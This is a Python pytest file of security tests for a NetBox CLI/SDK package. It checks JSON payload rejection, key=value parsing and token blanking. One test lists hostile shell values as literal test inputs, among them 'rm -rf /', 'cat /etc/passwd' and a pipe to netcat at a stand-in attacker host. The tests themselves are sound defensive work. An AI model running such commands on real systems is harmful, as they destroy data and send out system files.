"""Security tests for the netbox_cli package.

Covers: JSON payload injection/rejection, file path boundary for --body-file,
key=value pair injection, dynamic command argument handling, and token masking.
"""

from __future__ import annotations

import json

import pytest

from netbox_sdk.config import Config
from netbox_sdk.services import load_json_payload, parse_key_value_pairs

pytestmark = pytest.mark.suite_cli


# ---------------------------------------------------------------------------
# JSON payload injection and validation (load_json_payload)
# ---------------------------------------------------------------------------


def test_load_json_payload_rejects_bare_string() -> None:
    """--body-json must reject a bare JSON string (not an object or array)."""
    with pytest.raises(ValueError, match="object or array"):
        load_json_payload('"just a string"', None)


def test_load_json_payload_rejects_bare_number() -> None:
    """--body-json must reject a bare number."""
    with pytest.raises(ValueError, match="object or array"):
        load_json_payload("42", None)


def test_load_json_payload_rejects_bare_boolean() -> None:
    """--body-json must reject a bare boolean."""
    with pytest.raises(ValueError, match="object or array"):
        load_json_payload("true", None)


def test_load_json_payload_rejects_bare_null() -> None:
    """--body-json must reject null."""
    with pytest.raises(ValueError, match="object or array"):
        load_json_payload("null", None)


def test_load_json_payload_rejects_invalid_json() -> None:
    """Malformed JSON must raise json.JSONDecodeError (not silently pass)."""
    with pytest.raises(json.JSONDecodeError):
        load_json_payload("{not valid json}", None)


def test_load_json_payload_accepts_dict() -> None:
    """A valid JSON object must be accepted and returned as a dict."""
    result = load_json_payload('{"name": "test", "status": "active"}', None)
    assert isinstance(result, dict)
    assert result["name"] == "test"


def test_load_json_payload_accepts_list() -> None:
    """A valid JSON array must be accepted and returned as a list."""
    result = load_json_payload('[{"id": 1}, {"id": 2}]', None)
    assert isinstance(result, list)
    assert len(result) == 2


def test_load_json_payload_mutual_exclusion() -> None:
    """Passing both --body-json and --body-file must raise ValueError."""
    with pytest.raises(ValueError, match="not both"):
        load_json_payload('{"a": 1}', "/some/file.json")


def test_load_json_payload_both_none_returns_none() -> None:
    """When neither flag is set, load_json_payload must return None."""
    assert load_json_payload(None, None) is None


def test_load_json_payload_body_file_reads_valid_json(tmp_path) -> None:
    """--body-file must read a valid JSON file and return dict or list."""
    payload = {"name": "device1", "status": "active"}
    body_file = tmp_path / "payload.json"
    body_file.write_text(json.dumps(payload), encoding="utf-8")
    result = load_json_payload(None, str(body_file))
    assert isinstance(result, dict)
    assert result["name"] == "device1"


def test_load_json_payload_body_file_nonexistent_raises(tmp_path) -> None:
    """A nonexistent --body-file path must raise FileNotFoundError."""
    with pytest.raises(FileNotFoundError):
        load_json_payload(None, str(tmp_path / "nonexistent.json"))


def test_load_json_payload_body_file_rejects_non_object_non_array(tmp_path) -> None:
    """A --body-file containing a bare JSON value must be rejected."""
    body_file = tmp_path / "bad.json"
    body_file.write_text('"just a string"', encoding="utf-8")
    with pytest.raises(ValueError, match="object or array"):
        load_json_payload(None, str(body_file))


def test_load_json_payload_deeply_nested_json_does_not_hang() -> None:
    """Very deeply nested JSON must not hang or crash load_json_payload.
    Python's json module raises RecursionError or processes it; the function
    must terminate and either return a result or raise an exception."""
    depth = 500
    nested = "{" + '"k":' * (depth - 1) + "1" + "}" * (depth - 1)
    try:
        load_json_payload(nested, None)
    except (ValueError, json.JSONDecodeError, RecursionError):
        pass  # Any of these is acceptable — the point is: no infinite loop


def test_load_json_payload_json_with_embedded_null_bytes(tmp_path) -> None:
    """JSON body with null bytes in string values must be parsed as-is by
    json.loads (Python's json module allows null bytes in strings)."""
    body_file = tmp_path / "null_byte.json"
    body_file.write_bytes(b'{"name": "test\\u0000value"}')
    result = load_json_payload(None, str(body_file))
    assert isinstance(result, dict)


# ---------------------------------------------------------------------------
# Key-value pair injection (parse_key_value_pairs)
# ---------------------------------------------------------------------------


def test_parse_key_value_pairs_rejects_missing_equals() -> None:
    """Input without '=' must raise ValueError."""
    with pytest.raises(ValueError, match="key=value"):
        parse_key_value_pairs(["noequals"])


def test_parse_key_value_pairs_rejects_empty_key() -> None:
    """'=value' with an empty key must raise ValueError."""
    with pytest.raises(ValueError, match="key=value"):
        parse_key_value_pairs(["=value"])


def test_parse_key_value_pairs_allows_equals_in_value() -> None:
    """'key=a=b' must parse as key='a=b' (split on first '=' only)."""
    result = parse_key_value_pairs(["key=a=b"])
    assert result == {"key": "a=b"}


def test_parse_key_value_pairs_shell_metacharacters_preserved_as_literals() -> None:
    """Values containing shell metacharacters must be preserved verbatim and
    not interpreted as shell commands or special syntax."""
    dangerous_values = [
        "key=; rm -rf /",
        "key=$(whoami)",
        "key=`id`",
        "key=value && cat /etc/passwd",
        "key=value | nc attacker.com 4444",
    ]
    for raw in dangerous_values:
        k, _, v = raw.partition("=")
        result = parse_key_value_pairs([raw])
        assert result[k] == v, f"Shell metacharacters in {raw!r} were not preserved"


def test_parse_key_value_pairs_handles_multiple_pairs() -> None:
    """Multiple key=value pairs must all be parsed correctly."""
    result = parse_key_value_pairs(["status=active", "site=10", "limit=100"])
    assert result == {"status": "active", "site": "10", "limit": "100"}


def test_parse_key_value_pairs_empty_list_returns_empty_dict() -> None:
    assert parse_key_value_pairs([]) == {}


def test_parse_key_value_pairs_whitespace_around_key_trimmed() -> None:
    """Leading/trailing whitespace around the key must be trimmed."""
    result = parse_key_value_pairs(["  key  =value"])
    assert "key" in result


def test_parse_key_value_pairs_unicode_value_preserved() -> None:
    """Unicode values must be preserved as-is."""
    result = parse_key_value_pairs(["name=設備名"])
    assert result["name"] == "設備名"


# ---------------------------------------------------------------------------
# Token / credential masking
# ---------------------------------------------------------------------------


def test_config_token_secret_trimmed_to_none_when_blank() -> None:
    """A blank token_secret must become None, preventing accidental use."""
    cfg = Config(base_url="https://netbox.example.com", token_secret="")
    assert cfg.token_secret is None


def test_config_token_key_trimmed_to_none_when_blank() -> None:
    """A blank token_key must become None."""
    cfg = Config(base_url="https://netbox.example.com", token_key="  ")
    assert cfg.token_key is None


def test_config_json_serialization_contains_token_secret() -> None:
    """model_dump produces a dict including token_secret for persistence.
    This is expected behavior — the credential is intentionally stored.
    Validate its shape is predictable."""
    cfg = Config(
        base_url="https://netbox.example.com",
        token_key="mykey",
        token_secret="mysecret",
    )
    data = cfg.model_dump()
    assert data["token_secret"] == "mysecret"
    assert data["token_key"] == "mykey"
